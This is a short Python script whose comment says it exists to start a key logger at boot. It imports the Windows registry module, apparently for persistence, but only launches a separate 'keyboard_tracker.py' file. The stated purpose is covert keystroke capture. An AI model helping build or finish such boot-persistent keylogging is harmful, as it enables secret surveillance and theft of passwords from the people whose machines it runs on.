#goal of this file is to start the key logger at boot
import os
import sys
import winreg as reg

from subprocess import call

def open_tracer():
    call(["python", "keyboard_tracker.py"])

open_tracer()